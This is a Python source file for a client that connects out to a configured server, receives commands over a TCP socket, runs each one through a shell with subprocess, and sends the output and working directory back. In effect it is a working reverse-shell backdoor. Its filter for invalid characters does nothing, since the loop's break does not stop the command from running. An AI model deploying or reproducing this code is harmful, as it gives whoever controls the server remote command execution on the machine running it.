import logging
import os
import socket
import subprocess
import sys

from config import HOST, PORT, INVALID_CHAR_IN_COMMAND

def create_socket():
    """Creates a socket object."""
    try:
        # TCP connection
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        logging.info("socket creation successful!")
        return sock
    except socket.error as err:
        logging.error("Socket creation error:  %s", err)
        raise 


def connect_to_server(sock): 
        ''' Connects to the server address '''
        try: 
            sock.connect((HOST, PORT))       
            logging.info('Ready to interact with server.')
        except socket.error as err: 
            logging.error('Could not connect to the server: {}'.format(err)) 
            raise 


def commands_handler(sock): 
    ''' Interacts with the server with commands. '''
    # only taking command from server.
    try: 
        while True: 
            data = sock.recv(1024).decode('utf-8')
            print('command: ', data)

            if not data: 
                break 
            for invalid_char in INVALID_CHAR_IN_COMMAND: 
                if invalid_char in data: 
                    logging.warning('Invalid command: {}'.format(data))
                    break

            try:  
                if data[:2] == 'cd': 
                    cwd = os.getcwd()
                    print(cwd)
                    os.chdir(data[3:])
                    cwd = os.getcwd()  # str data 
                    print(cwd)

                terminal = subprocess.Popen(
                        data, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE
                )
                terminal_byte_data = terminal.stdout.read() + terminal.stderr.read()
                cwd = os.getcwd() + '> '
                output_data = terminal_byte_data + cwd.encode()  # make byte
                sock.send(output_data)

                # print the command in terminal making str
                print(terminal_byte_data.decode('utf-8')) 
            except BrokenPipeError as err: 
                logging.error('Subprocess pipe is broken: {}'.format(err))
            except Exception as e: 
                logging.error('Error executing the command: {}'.format(str(e)))
    except ConnectionResetError as err: 
        logging.error('Connection is rest by peer: {}'.format(err))
    except Exception as e: 
        logging.error('Error handling commands: {}'.format(str(e)))


def close_connection(sock):
    """Closes the client socket."""
    try: 
        sock.close()
        logging.info("Client is shutdown!")
        sys.exit(0)
    except Exception as e: 
        logging.error('Error while closing the socket: {}'.format(str(e)))


def main(): 
    ''' Main entrypoint of client. '''
    logging.basicConfig(level=logging.INFO)

    try: 
        sock = create_socket()
    except socket.error as err: 
        logging.error('Aborting the connection: socket could not be created: %s', err)
        return 

    try: 
        is_connected = connect_to_server(sock)
    except socket.error as err: 
        logging.error("Aborting the connection: could not connect to the server.")
        return 

    try: 
        commands_handler(sock)
    except KeyboardInterrupt: 
        logging.info("Client shutdown initiated by user.")
    finally: 
        close_connection(sock)


if __name__ == '__main__': 
    main()
